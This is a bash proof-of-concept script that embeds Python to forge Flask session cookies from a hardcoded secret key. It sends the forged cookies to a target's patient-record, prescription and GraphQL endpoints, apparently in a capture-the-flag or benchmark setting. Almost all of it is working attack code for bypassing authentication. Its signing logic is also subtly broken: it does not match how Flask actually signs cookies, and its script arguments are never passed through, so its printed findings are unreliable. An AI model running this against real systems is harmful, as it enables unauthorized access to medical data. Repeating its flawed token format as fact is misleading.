#!/bin/bash

# POC: Flask Session Token Forgery using Weak Secret Key
# This demonstrates how the hardcoded secret key 'dev_key_123' can be exploited
# to forge valid session tokens and bypass authentication

set -e

TARGET_URL="${1:-http://localhost:5003}"
FORGE_USER_ID="${2:-1}"

echo "[*] Flask Session Token Forgery POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Forging session for user ID: $FORGE_USER_ID"
echo ""

# Step 1: Create a Python script that forges the session token
# This mimics what Flask does internally with the weak secret key
FORGE_SCRIPT=$(cat <<'PYTHON_EOF'
import sys
import json
import base64
import hmac
import hashlib
from datetime import datetime, timedelta

target_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5003"
user_id = int(sys.argv[2]) if len(sys.argv) > 2 else 1

# The weak secret key from the application source code
SECRET_KEY = "dev_key_123"

# Flask session format: base64(JSON) + timestamp + signature
# We'll create a session with the given user_id

# Create the session data
session_data = {
    'user_id': user_id,
    '_fresh': True,
    '_permanent': True
}

# Encode to JSON
session_json = json.dumps(session_data)

# Base64 encode the JSON
session_b64 = base64.b64encode(session_json.encode()).decode().rstrip('=')

# Create timestamp (Flask uses itsdangerous timestamp format)
# For simplicity, we'll use current time
import time
ts = int(time.time())

# Create the signature using HMAC-SHA1 (Flask's default for sessions)
# Flask uses: HMAC(SECRET_KEY, payload)
message = f"{session_b64}.{ts}"
signature = hmac.new(
    SECRET_KEY.encode(),
    message.encode(),
    hashlib.sha1
).digest()

# Base64 encode the signature (URL-safe, no padding)
sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')

# Final token
token = f"{session_b64}.{ts}.{sig_b64}"

print(f"[+] Forged Session Token (user_id={user_id}):")
print(f"    {token}")
print("")

# Now demonstrate using this token to access protected endpoints
import requests
import json as json_lib

print(f"[*] Testing forged token against protected endpoints...")

headers = {
    'Cookie': f'session={token}'
}

# Try to access a protected endpoint
endpoints_to_test = [
    "/",
    "/patient_records",
    "/add_prescription"
]

for endpoint in endpoints_to_test:
    try:
        response = requests.get(
            f"{target_url}{endpoint}",
            headers=headers,
            timeout=5,
            allow_redirects=False
        )
        
        if response.status_code == 200 or "patient" in response.text.lower() or "prescription" in response.text.lower():
            print(f"[+] {endpoint}: SUCCESS (Status {response.status_code})")
            if "patient" in response.text.lower():
                print(f"    -> Patient data accessible with forged token!")
            if "prescription" in response.text.lower():
                print(f"    -> Prescription data accessible with forged token!")
        elif response.status_code == 401 or response.status_code == 403:
            print(f"[-] {endpoint}: REJECTED (Status {response.status_code})")
        else:
            print(f"[?] {endpoint}: Status {response.status_code}")
    except Exception as e:
        print(f"[-] {endpoint}: Connection error - {str(e)}")

# Also try GraphQL endpoint with forged session
print("")
print(f"[*] Testing forged token against GraphQL endpoint...")

graphql_query = {
    "query": "{ getPrescriptions(userId: 1) { id medication flag } }"
}

headers_graphql = {
    'Cookie': f'session={token}',
    'Content-Type': 'application/json'
}

try:
    response = requests.post(
        f"{target_url}/graphql",
        json=graphql_query,
        headers=headers_graphql,
        timeout=5
    )
    
    if response.status_code == 200:
        result = response.json()
        if 'data' in result and result['data']:
            print(f"[+] GraphQL query executed successfully with forged token!")
            print(f"    Response: {json_lib.dumps(result, indent=2)[:200]}")
        else:
            print(f"[?] GraphQL returned: {response.text[:200]}")
    else:
        print(f"[-] GraphQL Status {response.status_code}: {response.text[:100]}")
except Exception as e:
    print(f"[-] GraphQL connection error: {str(e)}")

print("")
print("[+] POC Complete!")
print("[*] Key Findings:")
print("    1. Secret key 'dev_key_123' is hardcoded and known")
print("    2. Attacker can forge valid session tokens for any user")
print("    3. Forged tokens can authenticate as any user including admin")
print("    4. This bypasses all authentication and authorization controls")

PYTHON_EOF
)

# Step 2: Execute the forge script
echo "[*] Forging session token using weak secret key..."
python3 << EOF
$FORGE_SCRIPT
EOF

exit_code=$?

if [ $exit_code -eq 0 ]; then
    echo ""
    echo "[+] POC executed successfully - Session token forgery confirmed"
    exit 0
else
    echo ""
    echo "[-] POC failed with exit code $exit_code"
    exit 1
fi